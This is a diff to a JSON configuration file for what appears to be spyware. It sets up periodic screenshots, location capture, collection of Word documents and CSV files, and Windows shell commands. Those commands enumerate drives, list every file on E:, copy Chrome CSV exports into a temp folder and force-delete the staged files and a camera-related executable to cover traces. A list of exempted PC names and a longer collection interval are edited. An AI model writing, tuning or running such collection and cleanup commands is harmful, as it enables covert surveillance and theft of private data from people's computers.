@@ -13,7 +13,7 @@
   "_fileExtensionsList": ["docx","doc"],
   "_allcertainFilesInRootFolder":"e:\\",
   "_certainFileTypeInRootFolder":"csv",
-  "timeRepeatMinutes": 30,
+  "timeRepeatMinutes": 60,
   "reloadconfigFileIs": true,
   "scrShotIs": true,
   "_pcCurrentLocIs": true,
@@ -26,8 +26,8 @@
   "____cmdCommandsList": ["wmic logicaldisk get deviceid, volumename >> \"C:\\Temp\\string2.txt\""],
   "_____cmdCommands": ["dir E:\\ /s /b >> \"C:\\Temp\\string2.txt\""],
   "______cmdCommands": ["copy \"D:\\Chrome*.csv\" \"C:\\Temp\\string3.txt\""],
-  "cmdCommands": ["del /f /q \"C:\\Temp\\string2.txt\" \"C:\\Temp\\string3.txt\""],
+  "________cmdCommands": ["del /f /q \"C:\\Temp\\string2.txt\" \"C:\\Temp\\string3.txt\""],
   "________cmdCommands": ["del /f /q \"C:\\Program Files\\Common Files\\cameraAnalysisEXE*.exe\""],
-  "skippedPcsList": ["min","DESKTOP-NCO579D","Sac","DESKTOP-BEVO3CC","husn","DESKTOP-5AHVE9S","sjd","DESKTOP-GPNKIVM","exp","DESKTOP-V15VGOT","osm","_DESKTOP-5M9D8EK"]
+  "skippedPcsList": ["min","DESKTOP-NCO579D","Sac","DESKTOP-BEVO3CC","husn","_DESKTOP-5AHVE9S","sjd","DESKTOP-GPNKIVM","exp","DESKTOP-V15VGOT","osm","_DESKTOP-5M9D8EK"]
   
 }
